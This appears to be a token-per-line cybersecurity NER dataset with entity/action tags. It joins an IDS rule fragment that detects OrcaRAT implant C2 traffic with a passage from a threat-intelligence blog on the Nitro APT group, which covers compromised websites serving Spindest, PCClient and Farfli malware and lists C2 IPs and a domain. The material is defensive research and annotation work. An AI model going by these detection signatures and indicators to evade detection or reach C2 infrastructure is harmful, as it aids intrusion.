;	O
flow	O
:	O
established	O
,	O
from_client	O
;	O
urilen	O
:	O
67<>170	O
;	O
content	O
:	O
"	O
Mozilla/4.0	O
(	O
compatible\	O
;	O
MSIE	O
8.0\	O
;	O
Windows	O
NT	O
5.1\	O
;	O
Trident/4.0\	O
;	O
.NET	O
CLR	O
2.0.50727\	O
;	O
.NET	O
CLR	O
3.0.04506.30\	O
;	O
.NET4.0C\	O
;	O
.NET4.0E	O
)	O
"	O
;	O
http_user_agent	O
;	O
content:"GET	O
"	O
;	O
http_method	O
;	O
pcre:"/^\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=	O
]	O
{	O
14,18}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{33,38}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{6,9}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{5,50}\/[A	O
-	O
Za	O
-	O
z0-	O
9+~=]{5,50}$/U	O
"	O
;	O
sid	O
:	O
YOUR_SID	O
;	O
rev:1	O
;	O
)	O
alert	O
http	O
any	O
any	O
-	O
>	O
any	O
any	O
(	O
msg:"::[PwC	O
CTD	O
]	O
:	O
:	O
-	O
OrcaRAT	O
implant	O
C2	O
confirmation	O
response	O
"	O
;	O
flow	O
:	O
established	O
,	O
from_client	O
;	O
urilen	O
:	O
67<>170	O
;	O
content	O
:	O
"	O
Mozilla/4.0	O
(	O
compatible\	O
;	O
MSIE	O
8.0\	O
;	O
Windows	O
NT	O
5.1\	O
;	O
Trident/4.0\	O
;	O
.NET	O
CLR	O
2.0.50727\	O
;	O
.NET	O
CLR	O
3.0.04506.30\	O
;	O
.NET4.0C\	O
;	O
.NET4.0E	O
)	O
"	O
;	O
http_user_agent	O
;	O
content:"POST	O
"	O
;	O
http_method	O
;	O
pcre:"/^\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=	O
]	O
{	O
14,18}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{33,38}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{6,9}\/[A	O
-	O
Za	O
-	O
z0	O
-	O
9+~=]{5,50}\/[A	O
-	O
Za	O
-	O
z0-	O
9+~=]{5,50}$/U	O
"	O
;	O
sid	O
:	O
YOUR_SID	O
;	O
rev:1	O
;	O
)	O
Appendix	O
A	O
:	O
Samples	O
of	O
Orca	O
RAT	O
.	O
In	O
mid	O
-	O
July	O
of	O
this	O
year	O
,	O
we	O
noticed	O
yet	O
another	O
legitimate	O
website	O
had	O
been	O
compromised	O
by	O
APT	O
actors	O
and	O
was	O
serving	O
malware	O
.	O
In	O
this	O
case	O
,	O
it	O
was	O
a	O
group	O
commonly	O
referred	O
to	O
as	O
"	O
Nitro	O
,	O
"	O
which	O
was	O
coined	O
by	O
Symantec	O
in	O
its	O
2011	O
whitepaper	O
.	O
As	O
we	O
dug	O
deeper	O
,	O
we	O
found	O
additional	O
compromised	O
legitimate	O
websites	O
and	O
malware	O
from	O
the	O
same	O
group	O
back	O
through	O
March	O
of	O
this	O
year	O
.	O
In	O
most	O
instances	O
,	O
the	O
malware	O
is	O
one	O
commonly	O
referred	O
to	O
as	O
"	O
Spindest	O
,	O
"	O
though	O
we	O
also	O
found	O
"	O
PCClient	O
"	O
and	O
"	O
Farfli	O
"	O
variants	O
in	O
use	O
by	O
the	O
group	O
.	O
We	O
do	O
n't	O
have	O
enough	O
data	O
to	O
say	O
for	O
certain	O
that	O
all	O
of	O
the	O
malware	O
in	O
this	O
blog	O
was	O
delivered	O
via	O
compromised	O
legitimate	O
websites	O
.	O
Historically	O
,	O
Nitro	O
is	O
known	O
for	O
targeted	O
spear	O
phishing	O
campaigns	O
and	O
using	O
Poison	O
Ivy	O
malware	O
,	O
which	O
was	O
not	O
seen	O
in	O
these	O
attacks	O
.	O
Since	O
at	O
least	O
2013	O
,	O
Nitro	O
appears	O
to	O
have	O
somewhat	O
modified	O
their	O
malware	O
and	O
delivery	O
methods	O
to	O
include	O
Spindest	O
and	O
legitimate	O
compromised	O
websites	O
,	O
as	O
reported	O
by	O
Cyber	O
Squared	O
's	O
TCIRT	O
.	O
Our	O
findings	O
indicate	O
they	O
are	O
continuing	O
to	O
evolve	O
with	O
the	O
addition	O
of	O
PCClient	O
and	O
Farfli	O
variants	O
.	O
The	O
Maltego	O
screenshot	O
below	O
shows	O
the	O
activity	O
we	O
describe	O
in	O
this	O
blog	O
.	O
These	O
events	O
impacted	O
at	O
least	O
the	O
following	O
industries	O
,	O
across	O
four	O
waves	O
.	O
A	O
US	O
based	O
IT	O
Solutions	O
provider	O
;	O
The	O
European	O
office	O
of	O
a	O
major	O
,	O
US	O
based	O
commercial	O
vendor	O
of	O
space	O
imagery	O
and	O
geospatial	O
content	O
;	O
A	O
European	O
leader	O
in	O
power	O
technologies	O
and	O
automation	O
for	O
utilities	O
and	O
industry	O
;	O
A	O
US	O
based	O
provider	O
of	O
medical	O
and	O
dental	O
imaging	O
systems	O
and	O
IT	O
solutions	O
.	O
In	O
July	O
,	O
Nitro	O
compromised	O
a	O
South	O
Korean	O
clothing	O
and	O
accessories	O
manufacturer	O
's	O
website	O
to	O
serve	O
malware	O
commonly	O
referred	O
to	O
as	O
"	O
Spindest	O
.	O
"	O
Of	O
all	O
the	O
samples	O
we	O
've	O
tied	O
to	O
this	O
activity	O
so	O
far	O
noted	O
in	O
this	O
blog	O
,	O
this	O
is	O
the	O
only	O
one	O
configured	O
to	O
connect	O
directly	O
to	O
an	O
IP	O
address	O
for	O
Command	O
and	O
Control	O
(	O
C2	O
)	O
.	O
This	O
IP	O
address	O
has	O
been	O
in	O
use	O
by	O
this	O
group	O
for	O
some	O
time	O
,	O
which	O
is	O
interesting	O
since	O
they	O
have	O
evolved	O
other	O
components	O
of	O
their	O
kill	O
chain	O
over	O
time	O
to	O
ensure	O
malware	O
delivery	O
,	O
but	O
oddly	O
not	O
altered	O
their	O
C2	O
infrastructure	O
.	O
It	O
is	O
simple	O
for	O
companies	O
to	O
block	O
any	O
outbound	O
traffic	O
to	O
this	O
IP	O
,	O
which	O
would	O
negate	O
the	O
effort	O
Nitro	O
put	O
into	O
successfully	O
delivering	O
the	O
malware	O
.	O
37	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
identify	O
it	O
,	O
and	O
the	O
PE	O
timestamp	O
shows	O
the	O
day	O
before	O
we	O
saw	O
it	O
.	O
In	O
addition	O
,	O
the	O
following	O
three	O
samples	O
were	O
found	O
roughly	O
a	O
week	O
apart	O
from	O
each	O
other	O
,	O
possibly	O
indicating	O
the	O
timing	O
of	O
the	O
waves	O
of	O
activity	O
.	O
Table	O
1	O
The	O
next	O
sample	O
we	O
found	O
is	O
commonly	O
known	O
as	O
PCClient	O
,	O
which	O
is	O
not	O
malware	O
previously	O
tied	O
to	O
this	O
group	O
.	O
We	O
discovered	O
this	O
,	O
and	O
many	O
of	O
the	O
following	O
samples	O
,	O
through	O
historic	O
IP	O
resolution	O
overlap	O
between	O
the	O
same	O
domains	O
alternately	O
resolving	O
to	O
either	O
the	O
223.25.233.248	O
or	O
196.45.144.12	O
.	O
The	O
second	O
IP	O
has	O
also	O
not	O
been	O
reported	O
as	O
tied	O
to	O
this	O
group	O
before	O
.	O
However	O
,	O
this	O
shifting	O
of	O
IP	O
resolutions	O
back	O
and	O
forth	O
indicates	O
Nitro	O
is	O
in	O
control	O
of	O
these	O
domains	O
.	O
It	O
also	O
makes	O
is	O
fairly	O
easy	O
for	O
any	O
Infosec	O
team	O
to	O
reach	O
the	O
same	O
conclusion	O
we	O
did	O
,	O
which	O
again	O
negates	O
their	O
use	O
both	O
of	O
a	O
previously	O
unreported	O
domain	O
and	O
IP	O
for	O
C2	O
,	O
as	O
well	O
as	O
a	O
new	O
family	O
of	O
malware	O
.	O
25	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
classify	O
this	O
sample	O
as	O
malware	O
.	O
Its	O
PE	O
timestamp	O
was	O
8	O
July	O
,	O
almost	O
a	O
week	O
prior	O
when	O
we	O
first	O
saw	O
it	O
.	O
Table	O
2	O
The	O
next	O
sample	O
was	O
another	O
Spindest	O
variant	O
and	O
had	O
the	O
same	O
timestamp	O
as	O
the	O
aforementioned	O
PcClient	O
sample	O
.	O
In	O
addition	O
,	O
Nitro	O
chose	O
to	O
use	O
the	O
same	O
C2	O
for	O
this	O
sample	O
,	O
making	O
it	O
easy	O
to	O
both	O
find	O
and	O
tie	O
to	O
the	O
group	O
.	O
41	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
classify	O
this	O
sample	O
as	O
malware	O
.	O
Table	O
3	O
The	O
next	O
wave	O
of	O
activity	O
we	O
found	O
took	O
place	O
in	O
mid	O
-	O
May	O
.	O
Both	O
samples	O
were	O
Spindest	O
variants	O
with	O
the	O
same	O
PE	O
timestamp	O
of	O
15	O
May.	O
While	O
neither	O
MD5s	O
for	O
C2	O
match	O
,	O
the	O
aforementioned	O
link	O
to	O
a	O
post	O
by	O
Cyber	O
Squared	O
's	O
TCIRT	O
did	O
document	O
Nitro	O
using	O
Spindest	O
variants	O
with	O
the	O
same	O
file	O
name	O
starting	O
late	O
December	O
last	O
year	O
.	O
In	O
that	O
case	O
they	O
used	O
the	O
historic	O
C2	O
IP	O
we	O
note	O
in	O
Table	O
1	O
in	O
this	O
blog	O
.	O
34	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
classify	O
the	O
first	O
sample	O
as	O
malware	O
,	O
and	O
40	O
AV	O
Vendors	O
the	O
second	O
sample	O
.	O
Table	O
4	O
Table	O
5	O
The	B-Entity
malware	I-Entity
dropped	B-Action
was	O
configured	O
to	O
use	B-Action
good.myftp[.]org	B-Entity
as	O
the	O
C2	B-Entity
URL	I-Entity
,	O
and	O
the	O
IP	O
resolution	O
was	O
223.25.233.248	O
.	O
Both	O
of	O
these	O
are	O
known	O
Nitro	O
Indicators	O
of	O
Compromise	O
(	O
IOCs	O
)	O
.	O
In	O
this	O
case	O
,	O
the	O
malware	O
was	O
a	O
Farfli	O
variant	O
,	O
again	O
not	O
a	O
malware	O
previously	O
tied	O
to	O
this	O
group	O
.	O
39	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
identify	O
the	O
file	O
as	O
malware	O
.	O
The	O
PE	O
timestamp	O
on	O
the	O
file	O
was	O
1	O
April	O
,	O
about	O
two	O
weeks	O
before	O
we	O
saw	O
the	O
file	O
.	O
Continuing	O
the	O
activity	O
,	O
we	O
discovered	O
the	O
actors	O
had	O
compromised	O
a	O
legitimate	O
website	O
belonging	O
to	O
an	O
international	O
technology	O
company	O
that	O
provides	O
Software	O
Configuration	O
and	O
Change	O
Management	O
(	O
SCCM	O
)	O
solutions	O
in	O
mid	O
-	O
May	O
.	O
(	O
It	O
is	O
a	O
well	O
regarded	O
company	O
and	O
partners	O
with	O
large	O
companies	O
such	O
as	O
Microsoft	O
.	O
)	O
Table	O
6	O
The	O
final	O
sample	O
,	O
from	O
mid	O
-	O
March	O
,	O
was	O
also	O
hosted	O
on	O
a	O
compromised	O
legitimate	O
website	O
,	O
this	O
time	O
a	O
small	O
,	O
US	O
based	O
IT	O
company	O
.	O
The	O
IP	O
resolved	O
by	O
the	O
C2	O
URL	O
was	O
changed	O
two	O
days	O
after	O
we	O
saw	O
this	O
file	O
to	O
overlap	O
with	O
good.myftp[.]org	O
for	O
a	O
month	O
before	O
returning	O
the	O
below	O
resolution	O
.	O
The	O
filename	O
matches	O
that	O
of	O
the	O
sample	O
in	O
Table	O
5	O
,	O
which	O
had	O
a	O
very	O
similar	O
third	O
level	O
C2	O
domain	O
and	O
the	O
same	O
IP	O
resolution	O
.	O
This	O
is	O
also	O
a	O
Spindest	O
variant	O
with	O
a	O
PE	O
timestamp	O
of	O
the	O
same	O
day	O
we	O
saw	O
it	O
.	O
39	O
AV	O
vendors	O
within	O
VirusTotal	O
properly	O
identify	O
the	O
file	O
as	O
malware	O
.	O
Table	O
7	O
As	O
this	O
post	O
and	O
previous	O
cited	O
research	O
show	O
,	O
APT	O
groups	O
such	O
as	O
Nitro	O
will	O
continue	O
to	O
evolve	O
their	O
techniques	O
within	O
the	O
kill	O
chain	O
to	O
avoid	B-Action
detection	B-Entity
.	O
However	O
,	O
they	O
also	O
demonstrate	O
the	O
value	O
of	O
tracking	O
these	O
threats	O
over	O
time	O
,	O
as	O
this	O
allowed	O
us	O
to	O
uncover	O
and	O
properly	O
attribute	O
the	O
new	O
IOCs	O
because	O
Nitro	O
was	O
still	O
re	B-Action
-	I-Action
using	I-Action
old	B-Modifier
C2	B-Entity
infrastructure	I-Entity
with	O
their	O
new	B-Entity
malware	I-Entity
.	O
For	O
Palo	O
Alto	O
Networks	O
customers	O
,	O
all	O
of	O
these	O
files	O
were	O
properly	O
identified	O
by	O
WildFire	O
as	O
malware	O
and	O
all	O
of	O
the	O
C2	O
domains	O
are	O
labeled	O
as	O
threats	O
in	O
both	O
Threat	O
Prevention	O
and	O
URL	O
Filtering	O
systems	O
.	O
